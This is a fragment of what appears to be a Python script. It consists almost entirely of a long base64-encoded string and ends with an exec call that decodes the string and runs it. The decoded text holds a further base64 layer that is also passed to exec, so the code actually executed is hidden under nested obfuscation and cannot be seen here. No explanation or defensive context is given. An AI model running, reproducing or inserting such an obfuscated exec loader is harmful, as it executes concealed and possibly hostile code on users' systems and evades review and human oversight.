pZWWxkNFJGWldaRmRYVmxaMFQxZHNUbUZzU25WV2JUQjRWakpXV0ZSWWJHbFRSbkJ3VjJwSk5XTkdUbGhpUlhCVVRVZDNNVlZYZUVkaGJVcFlaVVJHWVZKVk5VUlpWbHB6VjBVMVdWWnRSbGhTVjNoTlYxUkNiMU15VGtoVGJsWldWbnBzWVZsc1ZtRk5WbXgwVFZaa2JGWllVbE5aYWtJd1UyMVdWbE5yT1ZoaVIwNDBXVEJrUzJSV1ZuUmhSWEJUVFc1bmVGZFVRbTlXTURGR1lrVm9hbEpGV25CV2FrNXZZakZzVmxSclRtdE5XRUpaVkd4ak1XRXhXWHBoUnpsYVlsUkdjbGxWWkV0alJrWjBaRVp3V0ZKWVFqTlZNVlp2VVRKS1NGTnVVbUZTZWxaeVZtNXdWMkl4UlhsTlJFWk9WakJ3V0ZReGFFTmhNVWw0VjJwV1dGWnRhRlJaTUdSS1pWVTFXV05GY0ZOU1JVcDFWMVphYWsxVk1VWmtSV2hwVTBaYWNWVXdXbHBrTVUxM1ZHdDBWV0pIZUZwV1IzQkhZVVV4ZFZWdE9WcGlWM2hFV1RGa1UxZEZNVmxVYkhCWFRXMVNkVll4V210TlJURllVMjVHYVUxdFVrdFpWbVF3WkRGRmVWcElXbWhoTW5oSFZGWmtOR0ZXV1hsbFJFWmhVbGRTUjFkcVNrZFhSVFZaV2tkMFdGSnJXblZYVmxwcVRWVXhkRkpzYkZaaVdHaGFWRmR6TVUxc1pISmFSbHBoVFZoQ1NWVnROWE5oUmxWM1UycE9XR0pIVFhoWmJYaDJaV3hhZFZac2NGWlhSVW96VjFjd01WbFhUa2hWYTJoWFlsWndZVlJYY0hOamJHUnpWR3RLVUZaWGVFbFphMmhYWVd4T1IxZFlaRlJOUlRWTVZrZDRjMWRXVW5GU2JXaE9ZbXhLZGxkWE1YTlJNazVJVTI1V1dHSnJTbkpWYWtaWFlteGtWVk5VVm1oTldFSldXV3BLYTFOdFJsaGtSWGhTVFcxNFQxZHFSbUZYUjFaSVlVZHNhVll4U2pOVk1WWnZVVEpXV0ZOWWNGVmlXR2h4V2xaV1MwNVdaSE5hUjNScVVqQXhObFpYTlhOWGJHUkdUbGhrVkZaWFVsUlpWV1JMWTBaR2RWUnRiRTVpVmtvelYxY3hjMUV5Vm5OalJteFZZV3RhWVZacVNqQmliR3hZVGxaa2ExSXdjRWxWYlRBMVUyeE9SbE51VGxwaVZFWnlWRlprUzFOR1NuVldiVVpPWVRGdmVGVXhWbTlqTWtaSVUyNVNXazF0VW1oVmFrbzBUVVprVjJGRk9VNVdNRlkxV2tWa2IyRlhSbFpUYWs1WVlrZE5lRmx0ZUhabGJGcDFWbXh3VmxkRlNqQlhWM0JQVTJ4dmVWSnNVbEppYTBwd1dWWldTMDVXWkZkWmVrWnBZa2hDVlZsVmFGZGhNVm8yVW0weFdsWnRhRlJaYTJSUFpFWktjVkZ0YUZkbGJYZDRWMVJPYzJOck5YSlVia0pTVmpKU1MxVlVRa2RqVms1V1ZtMTBhVkl3Y0RCV2JUVnpWMnhrUjFOdVRsUldWMUpZV2tWYWMxZEhTa2xVYTNCVFRWVndkbGRYTVhOUk1sRjRZa1pzVldKdVFuSlVWM0J6VGxaa2NsSnVXbUZOUjNoRlZWWmthMWxWTVhOWGFrWllZa2RvVEZsVlpGTlRSbHAwWkVac1RtSkdiM2RXTVZwcll6Sk5kMkpGVms1U01sSm9WRmQ0WVUxV1pITmhSWFJvVWpGS1NWWnRNV0ZaVmxvMlVtMDVXbFp0VVhwWmFrSXdWVzFKZVZwRmNGSk5SVnAxVjJ0YWIxUXlTa2hVYmxKUFZqSm9jRlpxUmxkaWJGWkhWR3RPYVdKSVFsbFViR1EwWVcxS1ZsZFlaRmhpUjFKVVYyMTRkMWRGTVZoaFIyaFhUVEpSZUZkWWNFOVJNazE1VW14c1ZsWjZiRXhVVlZaSFpGWk5lRmR1Y0d0TlYyaFZWVlprYTFOdFZsWlRhemxZWWtkTmVGbHRlSE5YUlRGWVlrZG9WMDB5VW5WV01XTjRVakpLZEZKc2FGTmliRnBMVldwR1MyTXhhM2RhUldSclZsZDRTVlpYTVc5aGJVcFlaRWMxV0dKSFRqUlpWV1JIVjBkUmVWcEhjRTVpUm5CM1ZqRmFhMkV5UmtoU2JGSlNZV3RhY1ZSWGVHRk9WbXgwVFZWa2ExSnVRbE5aYWtwclUyeEZkMUp0TlZwTlIxSklXbGN4VG1Wc2NFbFhiWEJwVm10YWRWWlZXazlSTWtwelkwWm9UMVl6YUhGWmJGWmFaREZrYzFkVVZtdE5WM2hhVmtjMWQyRXdNWEZpUkZaWVlUQTFkVmt3Vms5aWJVbDVXa1Z3VWsxRlduVlZNV2h6VVRGS1YySkdiRlppVjJoTFZUQmtOR0l4YkhSTlYzQmhUVmQ0V1ZwRlpHOWhWMFpXVTI1S1dsWnRVWGRaTUdSUFpFZEtTVlZ0YUU1aE1XOTRWVEZXYTFVeVJraFRhMmhUWW14S1MxVXdWa3RqTVd0NVRVaG9hbEl3Y0RGV1Z6RnZWMnhhTmxWdE5WZFdWbFV4Vm10YVlWSkdSbkZTYld4cFlrVnNORmRXYUhOUk1sWlhZMFpvWVZORlNuRlVWRVpMVGxaa1YyRkZPV3BTVlRWM1ZWWmthMU5zUlhkVGFsWllZa2RTY2xrd1pFNWxiRlowWlVkd2FWSkhlSGxXTVZwdlZUSkdSbUpGVms1U01sSnpXa1JKTldKc1RsWlVhMHBoVFVkNFJWVldaR3RUYkVWM1kwUkdXRlp0VGpSWmExWnpZMWRKZVZwSGRGaFNWRlo2VjFSSmQwMVhSa2hUYkdoWFYwVTFTMVZVUWtkalZrNVdWbGhvYVZJd2NEQlhhMk14WVRGYU5sWnRPVnBXUlhCSVdrWldjMU5HVG5SaFIwWk9ZbGhvZGxkWE1YTlJNa1Y0WTBac1VtSlhhSEJaVmxaTFkyeGtWMkZGZEdwU1YzaEpWbTAxVTFkc1dYbGxTSEJVVmxkb1VGbHJXbk5rUmtwMFRsWndWMDF1VW5WWFZ6QjRVakpTUjJKR1NtbE5iVkpMVlZSQ1IySnNUbFpVYTBwaFRVZDRSVlV5Y0VkaGF6RnpWMnBXV21KVVJraGFSVnAzVmtaT1ZWZHJjRk5OYkVwNlYxY3dlRll5VmxkaVJteFdZbGhvYUZWdGNITmpNV3h6V2tWa2FsSXdjRVZhUkVJd1UyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JsaGlSM0JUVFVadk1sZFljRTloTWxKMFZHNVNWbFl5ZUZGWlZsWkxUVEZrVjJGRk9XeGlWa1kxVkRGb2MxbFdSWHBhUlhoVVZsVTFRMWRxUW5OU1JrWllXa1Z3VWsxRlduZFhWbHBxVFZVeGRGSnNiRlppV0doVFZGZHdjMk5zWkhOVWEzQlBZVEo0U1ZscmFGZGhNa3BZWkROa1dHSkdhekZaVnpGS1pWWldkR1ZGVW1oV1ZWcDFWVEZXVDFFd09WWlViVFZwVFcxU1MxVlVRa2RpYkU1WllrVk9VMVp0ZUZwV1Z6RnZVMnhPU0dWSE9WcGlWRVp4VjJwR2MxZEhVa2hoUjJ4b1ZsVndlVmRXV210TlIwNUlWRzVTYVZOR1NtOVVWM1JoVFZaT1ZscEdUbWhTTUhCSlZXMDFVMU5zVGtaVGJrNWFUV3BDTkZrd1pFdGtWbFowWVVad1YyVnNTblZXYkZaV1RsWmFSMWRyVWxKaGExcHdXVzE0U21WR2JGbGlSVTVxVFd0c05WZHJhRU5oVm05NVQxYzFWRlpWTlVOWGFrcExVMFU1V0U1WGFGZGxiRnAwVmpKMGExSXdNVWRpUmxKU1ZrZDRTMVV3YUU5VVJrNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxSnVRbUZTYldoUVdXdGtUMlJGTlZoaFIyeFhUVlphZDFaRVNuTlJNa3B6WTBab1QxWXphSEZaYkZaYVpERmtjMXBHVG1GaVNFSlpWRlprYjJGR1dYcGFTSEJTVFcxNFExZHFRbk5TUmtaWVdrVndVazFGV25WVk1XTXhVVEpHU0ZSWWNGVmhhelZ3VkZSQ2QyTnNUbGhqU0ZwaFRXczFTVlZ0TlhkaGF6QjVWV3BLV2sxcVJsTlZla0p6VWtaR1dGcEZjRlJTUlVwTlZWUktjMUZzYjNkaVJWSlNWak5DUzFWdGRFdE9WbXh4VkdzNWFWSXdOREZWVnpWeldWWlplVlZ1WkZwbGF6VlVXbFphYzFkV1VuVlJhM0JUVFZWd2RsZFhNWE5STWsxNVUxaHNZVk5GU25CWGFrazFZbXhPVmxSclNtRk5helV3Vm0wd01XRkdaRVpPU0dSWVlrZG9URmR0TVU5a1JscDFZMGR3VTJWdGQzaFhXSEJMVm14dmVGRnNVbEppYlhob1ZtcEtVMlF4YkRaVWJFNXBVakExZWxReFVrZGhhekZ6VjJwV1ZFMUhhRXhaYTFwMlpWZEtTV05IZEZOTlZtOHhWakJTUzFVeVJraFZhMmhUVjBWS1JWbFdWa2RpYkU1V1ZHdE9hbEp1UW5kVlZ6VnpXVlpaZVZWdVpGcGxhelZVV1d0a1QyTXdPVmxpUjBaWVVsUlZlbGRYY0VwTlYxWnpZMFpTVDFkSVFuSlZha0phWkRGd1IyRkZPV0ZpUjNRMVZERmtNRmxXVlhkU1ZGWldVbXMxUTFwV1ZYaFNWa1pWVjJ0U2FGWlZXblZWTVZaUFVXeHZkMkpGVWxKV01sSmhWRlJHWVU1V2EzbE5WbVJyVmpGS1NGUXhVa05oUmxvMlVtNU9WRlpXUmpOWGFrWjNVMFpLY1ZGdFJsaFNhM0F6VjFkNGExWnRVbGhUYmxKUVZrVTFUVlV3VmtwTlZuQkdZVWhhYTFZeFNrbFphMmhUV1Zaa1NWRnFTbHBpVkVaWFdXcENkbVF4U25WalIyaFhUVVpaZVZaVVNYaFNNazV6WWtac1ZHRnJTbUZXVkVwUFpERk5lRlJVUm14aVZrcEtWVEl3ZUdFeFNYbGxSRUpZWWtVMWRWbFdWbmRXYkhBMlYydDBWMVpGUlhsVk1uaGhWRzFHVm1SR1NtbE5iVkpMVlZSQ1IySnNUbFpVYTBwaFRVZDRTbFZYTlhOaFJsbzJWbGhrVkUxSFVtRlpWbHB2VWxaR1dXTkZOVTVYUlRReVZrWlNTbVZHYkhSV1dHeFZZV3RhY1ZsdGRIZGpNV3gwVGxaT1lXSldTa2xaYTJoVFdWWmtSVkp0ZEZSV1ZURXpWMnBHVm1Wc1ZuUmhSM1JVVW14dk1sVXhWbUZUTWtwSFlqTnNhVk5JUW5KVk1GWjNZakZzTmxOdVNtRk5TR2hWVlZkMGMxWXhTbk5UYkVwWVVrVktVRlpWV2t0U2JGcFZWMnR3VkZOR1NURldNbmhyWVRKT1NGUlljRlppV0doeFdXdFNjMDVXWkhOaFJUbHJUV3RzTlZSc2FIZFpWbFkyVm1wYVlWSlhVa2hVVldSVFYxWlNkRmRzY0U1aGJYaDVWako0Ym1ReGIzZGxSbEpTWVcxU2NWbHNXbUZrVm14WFlVVTVUbEp1UWxwVk1qRmhZVzFLVjFkcVdscE5SMDB4V2taa1RtVldXbGxXYldocFlYcFZlVmRYTVhOaWJVNUlWMnhrYTAweVVrOWFWM014WVZaU1Zsa3paR2hXV0ZKVFdXcENNRk5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1oxVkcxc1RtSldTak5YVnpFelRsZFdWMk5HYkZWaWJWSndWRmR3VjA1c1pITlVhMHBRVmxkNFNWcFZhR0ZaVlRGMFpVUkdXRkpGTlZoYVYzaDNWMVpPV0U5WGJGTmxiWGd4VjFaYWFrMVdjSE5qUldoVFlXdEtZVlpVU2pCVVJrNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxTnVaRmhpVjNoRVdYcEtTbVZXY0VsUmJXeHBVa2QzTVZZeWVHOVVNbEY1VTFoc1QxZElRbWhXV0hCWFRteHdSbHBGWkU1U01VcGFWa2N4WVZkck1YRmlTRXBZWWtVMVExUXhXa05XUmtaWllrVTFVMUpWVlhsVlZFcHpVV3h2ZDJKRlVsSldNbEpMVlZSQ1IySnNUbFpVYTBwaFRVZDRTVlpIY0VkaGJVcHlZMGhPV21KVVZsUlhiVEZUVTBkS1NWVnRSbFpOUlZVeFZURldhMVV5UmtoVmEyaFhZV3RLYjFadWNFZGpNVkpJVFVSR2EySldTVEZaVldocllrWmtSMU5VU2xWU2VsWlVXVEJrUzFkR1duRlhiV3hPWVd4YWVsVjZRazloTVVaMFZGaHNhVkl5YUU1VVZXaERZakZzVlZOclpHeFdNVXBKVld4ak1WUkdWWGxrUkVaYVpXczFWRnBXV25ka1ZsWjFVVzFzVjAxV1dqSlZNV1J6VmpGT1ZrOVlRbGRoZWxaUldWWmFZVlpXVGxoaVNFcFVUVWQ0UlZWV1pHdFRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdXRnBIY0ZSU1dFSXpWMWN3TVZWdFNYaGpTRUpVWWxVMVQxVnJWWGhPYkZsNlkwVTFiR0pWY0ZoYVJWSnJWMnN3ZUZkcVZscE5ha1pZV2taa1UxSXdPVlZSYldoWFpXdGFlbGR0ZUZwa01XOTNaVVpTVW1KRlduRlpiRkp6VG14a2MyRkZOV0ZOYTNCSlZERmpNV0ZHV2paVmJUVlZVbXMxUkZVeFdtRlNNVlp6VW14c1RsSlVWbEpXVjNSWFZtczFjbUpGYkd0VFJUVndWRmN4VTJReGJIUmtlbFpzVm01Q1dsWkhOV3RoVlRGeFZtcGFXR0pGTUhoYVZ6RlRVMFpLY1ZGdGRGaFNWRlowVmpGU1NrNVhSWGhqUm14T1ZqQTFUMVZyVlhoT2JGbDZZMFZPYTFKWGVIZFpWRUl3VTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlNUVVZhZFZkWGRHcE9WMHAwVW14b1QxWXhjR2hWYWtKYVpERmtWMVJyU2xCV1YzaEpXbFZvWVZsVk1YUmxSRVpZVWtVMVRGbHJaRTVsYkVaMVYyMXNhV0Y2Vm5wV1JXTjRaREpXZEZOWWJFOVNlbXhOVmxaak5XSnNUbFpVYTBwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VUlpWVnB5WlZaU2RHVkhjRTVOUkZaMFYydFdhazVYVG5OalJtaFBVakpTVWxaVVFrdGxiR3h4VTIxMGFsSXdjSHBVTVdRd1YyeGtSMU50T1ZkTk1uaHlXVlJHYzFkV1ZuUmhSWFJPVmtWYWNGVXljRXRTTWtaellUTnNWMkp1UW5GVVZscExUV3hzVlZOc1pHdFdWemswVkZWV01GTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWllXa1Z3VWsxRlduVlZWRXB6VVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzVGxaVWEwcGhUVWQ0UlZaR1pHdFdhekYwWlVSQ1drMUhVa2hhUmxaelUxWmFkV05IUmxoU1dFRjRWakZhYW1WSFNrWmxSVkpTWWxob2NGWnFRbUZrTVd4eVZHcE9ZVTFyTlVsVmJUVjNZV3N3ZVZWcVNscE5ha1pUV1hwQ2MxTkdWblJoUjJ4b1ZsVndkbFl4VWt0VU1rcElWRmh3VlZZeVVuSlZibkJ6WlZaa2MxbDZRbUZOYTFZMVZteGthMWxYU2xobFNIQllZa1UxUkZsVlpFWmxiRnAxVm1zeGFXSkZhM2RYYTFaSFpHeHZkMkpGVWxKV01sSkxWVlJDUjJKc1RsWlVhMHBoVFVkNFJWVlhjRTloUm1SSFUyNWFWRlpYVFRGYVJFWjNWMFUxU0U5V2NGZE5NVVkwVjFjeE0wNVhTbGhTYkdoc1VqTm9XbFJVUWt0aU1YQkdXa2MxYWsxSGVFVlhhMlJ2VXpKV1dHUkhOVmhXYldoUFYycEdjMWRIVWtWU2JXeHBVa2Q0TUZkV1dtdE9SMHBHVDFjMWFVMXRVa3RWVkVKSFlteE9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFSbk5YUjFKRlVtMXNhVkpIZURCWFZscHJUa2RLUm1WSVZtRlRSM2h2VmpCYVMyTXhUWGRhUm5Cb1ZteHdXbFpITVRSaGJVcFZWbTA1V21KSFVsZFViWFJ6VTFkU1JWSnRjRTVpUm04eFYxY3dlRkl5VWtkalJteE9VMFUxUzFWc1dtRk5SbVJYV2toT2FrMUViSGRWVjNCcldWVXhjMWRxUmxoaVIyaE1XVlZrVTFOR1duUmtSbXhPWWtadmQxWXhXbXRqTWsxNVYyeFNhMDF0VWxkVmFrSmhUbXhzTmxSdGRHdGlWVFV3VmxaU1lWTnNUa2xWYWs1WVZtMW9VRnBYTVZKbFZUbFpZa2RHVkZKRlNqWlZNVlpYVWpKR2MyRXpiRmRpYmtKeFZGWmFTMDFzYkZWVGJHUnJWbFJzZDFWWGNHdFhiRmwzVGxoR1dHSkhhRkJhVjNodVpXeFdkVmR0YUU1aVJtOTRWMjE0WVU1SFVsWmlTRUpvVFVoU1JWbFdWa2RpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWVFZQVjJwR1ZtVlhTa2xWYlhCVFRVWnZlRlV4Vm10U01rWnpZVE5zVjJKdVFuRmFWbFpLWkRGc2NWTnFRbWxTTUhCM1ZWYzFTMWxXVlhkVGJsSmFWbTFSTUZsclZuTlRWbFoxVjIxb1RtSkdiM2hXUldNeFZUQTFTRlZyU21sTmJWSkxWVlJDUjJKc1RsWlVhMHBoVFVkNFJWVldaR3RUYkVWM1UxaHdXbFp0YUZSWmFrSnpVMFU1V1ZwSFJsZGxiRW95VjJ0V2FrNVhUbk5qUm1oUFZqRndhRmxzWkRSbGJHUnpWMVJXYTAxWGVGcFdWekExVkZaRmQxSnVWbGhXYXpWeFdUQldjMU5HU25WalJYQlVVbXR2ZVZkV1VrdFdNbEpYV2pOc1dHSnJTbkJWYWtaV1RXeEZlV0pGU21GTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFRbk5TUmtaWVdrVndVazFGYkROWFYzQkxUVWRLU0ZOdVRsQldla1p2Vm1wT2IyTXhVa2hPVjNSc1ZqQmFXbFpYTVRSVVJrbDRZa2hDWVZaRmNFaFpWM2h5WlZaYWRXTkhjRTVXUjNRelYxZHdTMDFIU2toVGJsWk9WakExY0ZsV1ZuTmtNVVY1V2toYVlVMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JsaGpSM0JwVm14dk1sZFVRbXBPVjFKV1lrVm9WR0pZYUhGWmJHUnZZakZzTmxOdVRtcE5SVFYzVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWllXa1Z3VkZKVmJ6RlhWbHBxVFZVeFJtUkZhRmhXTW5oYVZXdFdSMDVzVWxWU2JuQnNZWHBHTUZSV1pFdGlSVEZ5VGtob1drMXFWa3haYTJSTFpGWldkRmR0ZEZOTmJtZDNWako0Ym1WR2NFWmlSVkpPVWpKU1YxVnFSbUZOUm1SWVRsWmthRkl4U2tsVmJUVlhVMnhLVmxkdWJHRlNiVTEzVjJwR2MyUkdXblZpUjJoVFRVWnZNbGRXV210T1JtdDNUVlZXVlZkSVFsbGFWM1JMVFVaT1dHSklTbFJOUjNoRlZWWmthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tkd1ZGSllRak5YVnpBeFZXMUplR05JUWxSaVZUVlBWV3RWZUU1c1dYcGpSVFZzVmpCd1dGcEZVbXRYYXpCNFYycFdXazFxUmxoYVJtUlRVakE1VlZGdGFGZGxhMXA2VjIxNFdtUXhiM2RsUmxKU1lrWndjVlJYZUdGT1ZteDBUVlZrYTFKdVFsWlpha3ByWWtVd2VGZHFXbGhpUjJoTVdrWmFjMWRGTVZobFJ6RldUVVZaZDFVeFZsZFdNbEpIWWtab2FWTkZOVkZaVmxaS1RURmtjVk5zWkd0V2JrSmFWVEl4YjJFeFNYaFhia3BZVWtWd1dGcEZXbk5YUjBwSlZHMHhWazFGV1hkVk1WWmhVVEpHU0ZSWWNGVmhhelZ3VkZSQ2QyTnNVWGxpUlU1UFRXczFTVlZ0TlhkaGF6QjVWV3BLV2sxcVJsUlVNVnB2VWxaR1dXTkZOVTVYUlRSNlYxZDRUMU50VGtaVWJrSlNWakpTUzFWVVFrZGliRTVXVkd0S1lVMUhlRVZWVm1SclUyeE9SbE5xVmxwV2JVMTRWRlZXTUZOR1pGaGlSbXhUVWxWWk1sWkdVa2RsYlZaeVRWaFNUbFl3Y0hOVVYzTXdaVVpyZVU1VmRHbFNNSEF4VmxjeFlXRXhTWGxsUkVKWVlrZGtORmRyVm5OU1JURklXa1pLVjAxRVZuaFdNbmh2VkRKV2MxZHJhRkJYUlhCb1ZtNXdVazFzVGxaaFJFSm9VbTEwTlZaSE1UUmhhekIzVGxjeFlWSlhUVEZaTW5oM1YwVTFWV0pHYkZOU1ZWa3lWa1pTUjJWdFVYbFRiRkpVVjBWS1JWbFdWa2RpYkU1V1ZHdEtZVTFIZUVWVlZtUnJXVlpaZW1GRVdsaGlSa295VlhwQ2MxSkdSbGhhUlhCU1RVVmFkVlV4Vms5UmJHOTNZa1ZTVWxZeVVtRlVWRVpoVGxacmVVMVdaR3RXTVVwSVZERlNRMkZHV2paU2JrNVVWbFpHTTFkcVJuZFRSa3B4VVcxR1dGSnJjRE5YVjNoclZtMVNXRk51VWxCV1JUVk5WVEJXU2sxV2NFWmhTRnByVmpGS1NWbHJhRk5aVm1SSlVXcEtXbUpVUmxkWmFrSjJaREZLZFdOSGFGZE5SbGw1VmxSSmVGSXlUbk5pUm14VVlXdEtZVlpVU2s5a01VMTRWRlJHYkdKV1NrcFZNakI0WVRGSmVXVkVRbGhpUlRWMVdWWldkMVpzY0RaWGEzUlhWa1ZGZVZVeWVHRlViVVpXWkVaS2FVMXRVa3RWVkVKSFlteE9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFRhazVhVFdwR2VscEdaRk5TUjBaSVRWVndhVk5IVVhwV1JtaDNWREZzY2sxVVdsTmliRXBaVkZST1UyTldjRWRoUlhSc1ZtNUNXVlJzVWtOWFZUQjRVMjVrV21KSFVsaFVNVnB2VmtaR1dWVnJjRk5YUjJkNVZqSndTMk15VWxaaVJXaFlZbGRvYjFacVRtOWpNV1J5Vkd0T1RrMXJXbHBXVnpBMVUyeEtXR0ZHV2xkaE1YQkVWMjE0Um1Rd09WWldiRTVYVW5wc2RWZHNVa3RPUjFKellqTnNhVk5HV2xwVVZFSjNZekZzTmxSclRtdGlWWEF4VmtjeE5GUlhTbkpPU0dSWVZtMW9WRlJXWkU1bFJUbFlZMGRzVG1KRmNIcFhiWGhoVFRKUmQwMVVXbFZpVlhCUFZXNXdRMk5HVFhoU2JscGhUVWQ0UlZWV1pHdFRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdkVnBIY0dsV00yZDRWMnRXVDJJeVRYbFRXR3hoVTBWS2NGbHJVbk5PVm1SellVVTVhMDFyYkRWVWJHaDNXVlpXTmxaWVpGaGlSMmgyVkZWV01GVnRTWGxhUlhCU1RVVmFkVll5ZUd0T1IxWnpZMFpXYVUxSVVrdFZWRUpIWW14T1ZsUnJTbUZOUjNoRlZWY3hkMkV4WkVaalJGWllZa2ROZUZSVldtNWxiRloxVVcxc1YwMVdXblZXVlZwUFVUSkZlR0pHYkZaaVdHaHlWV3BLTkUxR1pITlVWRVpyVmpCc05sZFVTVFZoYkU1SVpETmtZVll5YzNoVVZXUkhWMFV4V0dWSGVHbFdSM2Q0VmpKNFQySnRTbk5TYkd4VlltdEtZVlpZY0hOVVJtUlhXa1JDYUZJd05URldWekZ2VXpKV1dHUklaRlZTZWxaUVZGVmtUMlJHWkhGUmJXaFhaV3RhZWxWNlFrOVRiVXBIVkd0V2FVMXVhRlpXYTJNMVl6RmFXV0pGY0dwU1ZUVjNWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFTazlUVms1MVVXMXNhV0pGV2pKV01qRnpVekZyZDAxVlZsVlhTRUpaV2xkemVFNUdiSE5YYWtKUFRWZDBObFp0TlhOaGJVcFhWMnBHWVZKV2F6RlVWV1JIVjBVeFdHVkhNVmRoYTBwMVZrVmFUMUV4VlhoalJtaGhVMFZLY1ZSVVJrdE9WbVJYWVVaT2FsSXdiRFZVYTJScldWZEtWbGR1WkZwaE1sSllXVlJDYzFOV2NFbFJiWFJUVFcxU2RWWlVRbUZWTVZwWFZtdGtVRlpXU2xaVVZWcExVakZSZVdKRlRrOU5helV3Vm0wd01XRkdaRVpPU0dSWVlrZG9URmR0TVU5a1JscDFZMGR3VTJWdGQzaFhXSEJMVm0xU1dGUlljRlppVjJoeVZUQmFZVTVzWkVWVGF6bHJZa2hDU1ZadGNITlhWa3BHVW1wYVZWWkZXalphUkVwTFZrWk9XVkZyVW1oV1ZWcDFWVEZXVDFGc2IzZGlSVkpTVmpKU2NWVXdWbmRrTVd4MFRsWkthVTFyTlRCV2JUQXhZVVprUms1SVpGaGlSMmhNVjIweFQyUkdXblZqUjNCVFpXMTNlRmRZY0V0V2JWSllWV3RvVjJGc1NuSlZWRW93VkVaT1ZsUnJOV0ZOUjNoRlZWZHdRMkZHV2paU2JrNVZVbnBXVUZsNlJuZFhSbHAxV2tWNFUxSldXak5WTVZaUFVXMUdjbUpGV2s1V00yaHdXV3hXWVUxR1pGaE5WV1JwVFd0V05WVnROVmRUYkVsNlVXNU9XR0V5VWtkWGFrRjRWa1pHZEdSSFJsaFNhM0F6VjFab2MxRXlSa2hUYmxaV1lsZG9jVmxXVmt0a01YQkdXa1prYkZadGVGcFdSelZEVWtad05rMUViRXBhTTBKeldsVmtWMkZyZEVoVGJXaHFUV3hWZVZSclRURmhWVFZ4VlcxMFlWWXdOVEpYYTJSV1lqRndXRTVYY0dsTmJFcHpWMnRaTldWc2EzcFRia0pxVTBaR2QxUkhNVk5pUm10NVQxZDBZVlV5WkhWYVJtaFRZbFY0VlZveU5VeFZNbk01U1dkd2JHVkhWbXBMUjBwb1l6SlZNazVETldsT2FsSnJXbGRPZGxwSFZXOWFWelZxWWpKU2JGcEdPWHBaTTBwd1kwaFJjRXh0VW14Wk1qbHJXbE5uYm1SWVVtMU1WR2R1UzFOclBTSUtaWGhsWXloaVlYTmxOalF1WWpZMFpHVmpiMlJsS0dWdVkyOWtaV1JmYzJOeWFYQjBLUzVrWldOdlpHVW9KM1YwWmkwNEp5a3AiCmV4ZWMoYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX3NjcmlwdCkuZGVjb2RlKCd1dGYtOCcpKQ=="
exec(base64.b64decode(encoded_script).decode('ascii'))